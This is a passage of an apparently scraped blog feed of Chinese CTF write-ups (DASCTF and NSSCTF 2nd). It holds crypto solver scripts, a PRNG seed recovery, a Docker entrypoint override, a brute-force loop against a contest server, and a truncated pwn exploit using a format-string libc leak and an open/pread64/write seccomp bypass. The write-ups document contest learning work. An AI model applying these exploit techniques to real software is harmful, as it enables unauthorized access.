punctuation">)</span><span class="token comment" spellcheck="true">#+p64(canary)+b'a'*8+p64(system)</span>sl<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>ia<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202310211839964.png" alt="image-20231021183919918"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p>想恢复p,关键在于二次剩余</p><p>加密是一个比特一个比特地加密,恢复时判断是否为二次剩余即可恢复</p><p>对于q就更简单,直接求多项式的gcd即可</p><p>代码如下</p><pre class=" language-Python"><code class="language-Python">from gmpy2 import *from Crypto.Util.number import *c = 124349762993424531697403299350944207725577290992189948388824124986066269514204313888980321088629462472088631052329128042837153718129149149661961926557818023704330462282009415874674794190206220980118413541269327644472633791532767765585035518183177197863522573410860341245613331398610013697803459403446614221369(e1, noise1, c1) = (1743, 44560588075773853612820227436439937514195680734214431948441190347878274184937952381785302837541202705212687700521129385632776241537669208088777729355349833215443048466316517110778502508209433792603420158786772339233397583637570006255153020675167597396958251208681121668808253767520416175569161674463861719776, 65643009354198075182587766550521107063140340983433852821580802983736094225036497335607400197479623208915379722646955329855681601551282788854644359967909570360251550766970054185510197999091645907461580987639650262519866292285164258262387411847857812391136042309550813795587776534035784065962779853621152905983)(e2, noise2, c2) = (1325, 35282006599813744140721262875292395887558561517759721467291789696459426702600397172655624765281531167221787036009507833425145071265739486735993631460189629709591456017092661028839951392247601628468621576100035700437892164435424035004463142959219067199451575338270613300215815894328788753564798153516122567683, 50327632090778183759544755226710110702046850880299488259739672542025916422119065179822210884622225945376465802069464782311211031263046593145733701591371950349735709553105217501410716570601397725812709771348772095131473415552527749452347866778401205442409443726952960806789526845194216490544108773715759733714)n2 = 103670293685965841863872863719573676572683187403862749665555450164387906552249974071743238931253290278574192713467491802940810851806104430306195931179902098180199167945649526235613636163362672777298968943319216325949503045377100235181706964846408396946496139224344270391027205106691880999410424150216806861393n1 = 65634094430927080732256164808833233563732628654160389042977689628512527168256899310662239009610512772020503283842588142453533499954947692968978190310627721338357432052800695091789711809256924541784954080619073213358228083200846540676931341013554634493581962527475555869292091755676130810562421465063412235309str0=''#wp装不下这么长的字符#legendre_symbol(i,p)def GCD(a, b):    if(b == 0):        return a.monic()            else:        return GCD(b, a % b)F.<x>=PolynomialRing(Zmod(n2))f1=(x+noise1)^e1-c1f2=(x+noise2)^e2-c2#print(GCD(f1,f2))q=n2-103670293685965841863872863719573676572683187403862749665555450164387906552249974071743238931253290278574192713467491802940810851806104430306195931179902084990861262304328268863425199809518254496553684067856859306280794877830073274539837451563189724268783548897996668966918676147376205691514341926655798880936print(q)print(q.nbits())strlist=str0.split('n')#print(strlist)intlist=[int(i) for i in strlist[:-1]]#print(intlist)p=''for i in intlist:    #print('test'+p)    if jacobi(i,n1)==1:        p='1'+p        #print(p)    else:        p='0'+pprint(p)print(int(p,base=2))p=int(p,base=2)      print(is_prime(p))print(ZZ(p).nbits())n=p*qphi=(p-1)*(q-1)d=inverse_mod(65537,phi)print(long_to_bytes(int(pow(c,d,n))))</code></pre><h2 id="CB-backpack"><a href="#CB-backpack" class="headerlink" title="CB backpack"></a>CB backpack</h2><p>由于连续六个01串中有3个1，在原始背包格的基础上每连续六列新增一列，限制这个条件，最终LLL即可还原</p><p><del>脚本丢了XD</del></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="wp" scheme="http://lmarch2.github.io/categories/wp/"/>
    
    
    <category term="ctf" scheme="http://lmarch2.github.io/tags/ctf/"/>
    
    <category term="DASCTF" scheme="http://lmarch2.github.io/tags/DASCTF/"/>
    
  </entry>
  
  <entry>
    <title>NSSCTF 2nd wp</title>
    <link href="http://lmarch2.github.io/posts/4b18615c/"/>
    <id>http://lmarch2.github.io/posts/4b18615c/</id>
    <published>2023-08-29T16:31:50.000Z</published>
    <updated>2024-02-04T16:07:15.662Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="NSSCTF-2nd-WP"><a href="#NSSCTF-2nd-WP" class="headerlink" title="NSSCTF 2nd WP"></a>NSSCTF 2nd WP</h1><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="gift-in-qrcode"><a href="#gift-in-qrcode" class="headerlink" title="gift_in_qrcode"></a>gift_in_qrcode</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> qrcode<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">from</span> random <span class="token keyword">import</span> randrange<span class="token punctuation">,</span> getrandbits<span class="token punctuation">,</span> seed<span class="token keyword">import</span> os<span class="token keyword">import</span> base64flag <span class="token operator">=</span> os<span class="token punctuation">.</span>getenv<span class="token punctuation">(</span><span class="token string">"FLAG"</span><span class="token punctuation">)</span><span class="token keyword">if</span> flag <span class="token operator">==</span> None<span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token string">"flag{test}"</span>secret_seed <span class="token operator">=</span> randrange<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span>seed<span class="token punctuation">(</span>secret_seed<span class="token punctuation">)</span>reveal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    reveal<span class="token punctuation">.</span>append<span class="token punctuation">(</span>str<span class="token punctuation">(</span>getrandbits<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>target <span class="token operator">=</span> getrandbits<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>reveal <span class="token operator">=</span> <span class="token string">","</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>reveal<span class="token punctuation">)</span>img_qrcode <span class="token operator">=</span> qrcode<span class="token punctuation">.</span>make<span class="token punctuation">(</span>reveal<span class="token punctuation">)</span>img_qrcode <span class="token operator">=</span> img_qrcode<span class="token punctuation">.</span>crop<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> img_qrcode<span class="token punctuation">.</span>size<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">35</span><span class="token punctuation">,</span> img_qrcode<span class="token punctuation">.</span>size<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">35</span><span class="token punctuation">)</span><span class="token punctuation">)</span>offset<span class="token punctuation">,</span> delta<span class="token punctuation">,</span> rate <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">5</span>img_qrcode <span class="token operator">=</span> img_qrcode<span class="token punctuation">.</span>resize<span class="token punctuation">(</span>    <span class="token punctuation">(</span>int<span class="token punctuation">(</span>img_qrcode<span class="token punctuation">.</span>size<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">/</span> rate<span class="token punctuation">)</span><span class="token punctuation">,</span> int<span class="token punctuation">(</span>img_qrcode<span class="token punctuation">.</span>size<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">/</span> rate<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> Image<span class="token punctuation">.</span>LANCZOS<span class="token punctuation">)</span>img_out <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">"RGB"</span><span class="token punctuation">,</span> img_qrcode<span class="token punctuation">.</span>size<span class="token punctuation">)</span><span class="token keyword">for</span> y <span class="token keyword">in</span> range<span class="token punctuation">(</span>img_qrcode<span class="token punctuation">.</span>size<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> range<span class="token punctuation">(</span>img_qrcode<span class="token punctuation">.</span>size<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        pixel_qrcode <span class="token operator">=</span> img_qrcode<span class="token punctuation">.</span>getpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> pixel_qrcode <span class="token operator">==</span> <span class="token number">255</span><span class="token punctuation">:</span>            img_out<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span>                <span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token punctuation">(</span>                    randrange<span class="token punctuation">(</span>offset<span class="token punctuation">,</span> offset <span class="token operator">+</span> delta<span class="token punctuation">)</span><span class="token punctuation">,</span>                    randrange<span class="token punctuation">(</span>offset<span class="token punctuation">,</span> offset <span class="token operator">+</span> delta<span class="token punctuation">)</span><span class="token punctuation">,</span>                    randrange<span class="token punctuation">(</span>offset<span class="token punctuation">,</span> offset <span class="token operator">+</span> delta<span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            img_out<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span>                <span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token punctuation">(</span>                    randrange<span class="token punctuation">(</span>offset <span class="token operator">-</span> delta<span class="token punctuation">,</span> offset<span class="token punctuation">)</span><span class="token punctuation">,</span>                    randrange<span class="token punctuation">(</span>offset <span class="token operator">-</span> delta<span class="token punctuation">,</span> offset<span class="token punctuation">)</span><span class="token punctuation">,</span>                    randrange<span class="token punctuation">(</span>offset <span class="token operator">-</span> delta<span class="token punctuation">,</span> offset<span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token punctuation">)</span>img_out<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">"qrcode.png"</span><span class="token punctuation">)</span><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"qrcode.png"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"This my gift:"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span>ans <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">"What's your answer:"</span><span class="token punctuation">)</span><span class="token keyword">if</span> ans <span class="token operator">==</span> str<span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"No no no!"</span><span class="token punctuation">)</span></code></pre><p>题目所给附件内容如上</p><p>分析过后发现直接输入打印出的target即可获得flag</p><h3 id="Magic-Docker"><a href="#Magic-Docker" class="headerlink" title="Magic Docker"></a>Magic Docker</h3><p>题目提示执行命令，docker run randark/nssctf-round15-magic-docker</p><p>执行过后发现要求输入secrect</p><p>查看docker文件</p><p>发现app文件下的miain.py文件为</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> click<span class="token keyword">import</span> random<span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep@click<span class="token punctuation">.</span>command<span class="token punctuation">(</span><span class="token punctuation">)</span>@click<span class="token punctuation">.</span>option<span class="token punctuation">(</span><span class="token string">'--secret'</span><span class="token punctuation">,</span>help<span class="token operator">=</span><span class="token string">'default=none,between 0 and 100'</span><span class="token punctuation">,</span>type<span class="token operator">=</span>int<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">func</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> str<span class="token punctuation">(</span>secret<span class="token punctuation">)</span><span class="token operator">==</span>str<span class="token punctuation">(</span>answer<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Congratulations!"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"But where is your flag?  (=‵ω′=)"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"No! You don't know anything about docker!"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"How dare you! "</span><span class="token punctuation">)</span>BANNER<span class="token operator">=</span><span class="token triple-quoted-string string">"""███╗   ██╗███████╗███████╗ ██████╗████████╗███████╗    ██████╗ ███╗   ██╗██████╗            ████╗  ██║██╔════╝██╔════╝██╔════╝╚══██╔══╝██╔════╝    ╚════██╗████╗  ██║██╔══██╗           ██╔██╗ ██║███████╗███████╗██║        ██║   █████╗       █████╔╝██╔██╗ ██║██║  ██║           ██║╚██╗██║╚════██║╚════██║██║        ██║   ██╔══╝      ██╔═══╝ ██║╚██╗██║██║  ██║           ██║ ╚████║███████║███████║╚██████╗   ██║   ██║         ███████╗██║ ╚████║██████╔╝           ╚═╝  ╚═══╝╚══════╝╚══════╝ ╚═════╝   ╚═╝   ╚═╝         ╚══════╝╚═╝  ╚═══╝╚═════╝                                                                                                        ███╗   ███╗ █████╗  ██████╗ ██╗ ██████╗    ██████╗  ██████╗  ██████╗██╗  ██╗███████╗██████╗ ████╗ ████║██╔══██╗██╔════╝ ██║██╔════╝    ██╔══██╗██╔═══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗██╔████╔██║███████║██║  ███╗██║██║         ██║  ██║██║   ██║██║     █████╔╝ █████╗  ██████╔╝██║╚██╔╝██║██╔══██║██║   ██║██║██║         ██║  ██║██║   ██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗██║ ╚═╝ ██║██║  ██║╚██████╔╝██║╚██████╗    ██████╔╝╚██████╔╝╚██████╗██║  ██╗███████╗██║  ██║╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝ ╚═════╝    ╚═════╝  ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝                                                                                            """</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"rm -f /flag"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>BANNER<span class="token punctuation">)</span>    random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span><span class="token string">"NSSCTF 2nd"</span><span class="token punctuation">)</span>    answer<span class="token operator">=</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">2</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"You need to give me the secret!"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        func<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>若按照预设命令执行完main.py后，容器会删除flag文件</p><p>所以我们自定义docker启动命令</p><p>直接执行cat /flag</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308300038709.png" alt="image-20230829233059165"></p><h3 id="gift-in-qrcode-revenge"><a href="#gift-in-qrcode-revenge" class="headerlink" title="gift_in_qrcode(revenge)"></a>gift_in_qrcode(revenge)</h3><p>链接一下得到一堆Base64编码</p><p>先写个脚本解码Base64保存为png</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token comment" spellcheck="true"># Paste the Base64 encoded string here</span>base64_string <span class="token operator">=</span> <span class="token string">"your_base64_string_here"</span><span class="token comment" spellcheck="true"># Decode the Base64 string</span>decoded_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>base64_string<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># Save the decoded data as a PNG file</span><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"image.png"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>decoded_data<span class="token punctuation">)</span></code></pre><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308300038022.png"></p><p>扫码得到二十个随机数</p><p>根据计算随机数种子，并计算下一个随机数，输入程序中即可拿到flag</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> random <span class="token keyword">import</span> randrange<span class="token punctuation">,</span> getrandbits<span class="token punctuation">,</span> seed<span class="token keyword">def</span> <span class="token function">poc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        secret_seed <span class="token operator">=</span> i        seed<span class="token punctuation">(</span>secret_seed<span class="token punctuation">)</span>        a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">,</span><span class="token number">232</span><span class="token punctuation">,</span><span class="token number">198</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">215</span><span class="token punctuation">,</span><span class="token number">226</span><span class="token punctuation">,</span><span class="token number">198</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">189</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">210</span><span class="token punctuation">,</span><span class="token number">84</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">134</span><span class="token punctuation">,</span><span class="token number">221</span><span class="token punctuation">,</span><span class="token number">207</span><span class="token punctuation">,</span><span class="token number">167</span><span class="token punctuation">,</span><span class="token number">176</span><span class="token punctuation">]</span>        reveal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            reveal<span class="token punctuation">.</span>append<span class="token punctuation">(</span>getrandbits<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> reveal <span class="token operator">==</span> a<span class="token punctuation">:</span>            flag <span class="token operator">=</span> getrandbits<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> flag    <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">print</span><span class="token punctuation">(</span>poc<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308300038655.png" alt="image-20230830001615052"></p><p>然后最无脑的爆破来了</p><p>为什么要爆这么久，早知道我再多爆一会的..</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>count <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    conn <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node5.anna.nssctf.cn"</span><span class="token punctuation">,</span> <span class="token number">28380</span><span class="token punctuation">)</span>    conn<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    conn<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    conn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token string">'110'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    count <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'count:'</span><span class="token punctuation">,</span> count<span class="token punctuation">)</span>    output <span class="token operator">=</span> conn<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'No no no!'</span> <span class="token operator">not</span> <span class="token keyword">in</span> output<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>        <span class="token keyword">break</span></code></pre><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308300038607.png" alt="image-20230830001858060"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="EzRSA"><a href="#EzRSA" class="headerlink" title="EzRSA"></a>EzRSA</h3><p>发现e - 3 ，低加密指数爆破</p><p>脚本一把梭</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> binascii<span class="token keyword">import</span> gmpy2e <span class="token operator">=</span> <span class="token number">3</span><span class="token comment" spellcheck="true"># 读入 n, 密文</span>n <span class="token operator">=</span> <span class="token number">115383855234466224643769657979808398804254899116842846340552518876890834212233960206021018541117724144757264778086129841154749234706140951832603640953383528482125663673926452745186670807057426128028379664506531814550204605131476026038420737951652389070818761739123318769460392218629003518050621137961009397857</span>c <span class="token operator">=</span> <span class="token number">5329266956476837379347536739209778690886367516092584944314921220156032648621405214333809779485753073093853063734538746101929825083615077</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>c<span class="token operator">+</span>i<span class="token operator">*</span>n<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        m<span class="token operator">=</span>res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"L"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"i="</span><span class="token operator">+</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    i <span class="token operator">=</span> i<span class="token operator">+</span><span class="token number">1</span></code></pre><blockquote><p> NSSCTF{Rea1_Si9n3n}</p></blockquote><h3 id="FunnyEncrypt"><a href="#FunnyEncrypt" class="headerlink" title="FunnyEncrypt"></a>FunnyEncrypt</h3><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308300039451.png" alt="image-20230830002659009"></p><p>本来想看看能不能词频分析的，结果发现完全对不到</p><p>只好根据已知的nssctf和前面的一堆话里面寻找符合预感的字符与字母对应关系  ， 慢慢对应着可以找到的</p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="happy"><a href="#happy" class="headerlink" title="happy"></a>happy</h3><p><img src="https://gitee.com/lmarch2/images/raw/master/Typora/202402042319627.png"></p><p>主函数首先绕过proof，接着fork一个子进程，在父进程中进行一个有沙箱限制的shellcode执行</p><blockquote><p>这个地方在调试的时候可能容易卡住，需要用set follow-fork-mode parent停留在父进程继续调试</p></blockquote><p>首先我们来看proof函数</p><p><img src="https://gitee.com/lmarch2/images/raw/master/Typora/202402042339598.png" alt="image-20240204233943567"></p><p>要想让v4=v3，那么只能通过printf看看可不可以把一些信息泄露出来，然后再通过计算得到puts的地址</p><p>通过调试能够发现，printf可以把栈上的数据打印出来，这里选择泄露出_IO_2_1_stderr_的libc地址</p><p>计算得到puts的真实地址，绕过proof检测</p><blockquote><p>这里一定注意scanf函数的一些特性，特别是涉及到\n，+-号函数是会部分忽略还是完全忽略还是正常调用十分关键，这可以帮助节约大量调试的时间</p><p>参考：<a href="https://blog.csdn.net/qq_54218833/article/details/121308367">https://blog.csdn.net/qq_54218833/article/details/121308367</a></p></blockquote><p>接下来就是shellcode的编写了</p><pre class=" language-c"><code class="language-c">__int64 <span class="token function">sandbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  __int64 v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-8h]</span>  v1 <span class="token operator">=</span> <span class="token function">seccomp_init</span><span class="token punctuation">(</span><span class="token number">2147418112LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">42LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">57LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">322LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">seccomp_load</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>可以看出来禁用了read，connect，execve 调用</p><p>这里用open，pread64，write绕过</p><p>写exp</p><pre class=" language-python"><code class="language-python"> <span class="token keyword">from</span> Excalibur <span class="token keyword">import</span><span class="token operator">*</span>contextset<span class="token punctuation">(</span><span class="token punctuation">)</span>proc<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#debug('b *0x4013FA\nb *0x401514\n')</span><span class="token comment" spellcheck="true">#debug('b *0x40142E\nb *0x401490\n')</span><span class="token comment" spellcheck="true">#debug('b *0x401508\n')</span>debug<span class="token punctuation">(</span><span class="token string">'b *0x401563\n'</span><span class="token punctuation">)</span>el<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>lib<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>puts_got <span class="token operator">=</span> got<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0x403FF0</span>stderr <span class="token operator">=</span> libcsym<span class="token punctuation">(</span><span class="token string">'_IO_2_1_stderr_'</span><span class="token punctuation">)</span>puts <span class="token operator">=</span> libcsym<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span>b<span 